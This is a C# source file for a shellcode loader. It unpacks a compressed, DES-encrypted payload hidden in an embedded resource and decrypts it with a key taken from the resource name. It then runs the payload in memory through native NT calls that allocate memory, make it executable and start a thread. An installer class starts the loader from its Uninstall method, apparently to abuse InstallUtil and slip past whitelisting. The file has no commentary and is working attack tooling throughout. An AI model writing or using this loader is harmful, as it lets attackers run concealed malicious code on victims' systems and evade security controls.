using System;
using System.Configuration.Install;
using System.IO.Compression;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using static IUL.Win32;


namespace IUL
{
    public class Runner
    {
        public static void Execute()
        {
            try
            {
                Assembly assembly = Assembly.GetExecutingAssembly();

                var names = GetResourceNames(assembly);
                if (names.Length == 0) { return; }

                string name = "";
                foreach (var n in names)
                {
                    if (!n.Contains("costura"))
                    {
                        name = n;
                        break;
                    }
                }

                var payload = UnpackResource(name, assembly);
                if (payload.Length == 0) { return; }

                var t = GetEncryptionKey(names[0]);
                payload = DecryptPayload(payload, t.Item1, t.Item2);
                if (payload.Length == 0) { return; }

                Run(payload);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        private static void Run(byte[] payload)
        {
            IntPtr baseAddress = IntPtr.Zero;
            uint regionSize = (uint)payload.Length;
            uint flOld = 0;
            IntPtr targetThread = IntPtr.Zero;
            ClientId id = new ClientId();

            int status = Win32.NtAllocateVirtualMemory((IntPtr)(-1), ref baseAddress, 0, ref regionSize, 0x3000, 0x04);
            if (IsSuccess(status))
            {
                Marshal.Copy(payload, 0, baseAddress, payload.Length);
                status = Win32.NtProtectVirtualMemory((IntPtr)(-1), ref baseAddress, ref regionSize, 0x20, ref flOld);
                if (IsSuccess(status))
                {
                    status = Win32.RtlCreateUserThread((IntPtr)(-1), IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero,
                        baseAddress, IntPtr.Zero, ref targetThread, ref id);
                    if (IsSuccess(status))
                    {
                        NtWaitForSingleObject(targetThread, false, 0);
                        NtClose(targetThread);
                    }
                }
            }
        }

        static bool IsSuccess(int value)
        {
            return (value >= 0 && value <= 0x3FFFFFFF) || (value >= 0x40000000 && value <= 0x7FFFFFFF);
        }

        private static string[] GetResourceNames(Assembly assembly)
        {
            try
            {
                var resources = assembly.GetManifestResourceNames();
                return resources;
            }
            catch (Exception)
            {
                return new string[0];
            }
        }

        private static byte[] UnpackResource(string name, Assembly assembly)
        {
            try
            {
                using (Stream manifestResourceStream = assembly.GetManifestResourceStream(name))
                {
                    using (DeflateStream source = new DeflateStream(manifestResourceStream, CompressionMode.Decompress))
                    {
                        MemoryStream destination = new MemoryStream();
                        source.CopyTo(destination);
                        return destination.ToArray();
                    }
                }
            }
            catch (Exception ex)
            {
                return new byte[0];
            }
        }

        private static byte[] DecryptPayload(byte[] payload, byte[] key, byte[] iv)
        {
            try
            {
                using (MemoryStream ms = new MemoryStream(payload))
                {
                    var des = DES.Create();
                    des.Padding = PaddingMode.None;
                    var csDecrypt = new CryptoStream(ms, des.CreateDecryptor(key, iv), CryptoStreamMode.Read);
                    byte[] payloadDecrypted = new byte[payload.Length];
                    csDecrypt.Read(payloadDecrypted, 0, payloadDecrypted.Length);
                    return payloadDecrypted;
                }
            }
            catch (Exception) { return new byte[0]; }
        }

        private static Tuple<byte[], byte[]> GetEncryptionKey(string data)
        {
            var dataSplitted = data.Split('_');
            var key = Convert.FromBase64String(dataSplitted[0]);
            var iv = Convert.FromBase64String(dataSplitted[1]);
            return new Tuple<byte[], byte[]>(key, iv);
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Loader : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            try
            {
                Runner.Execute();
            }
            catch (Exception e)
            {

            }
        }
    }
}
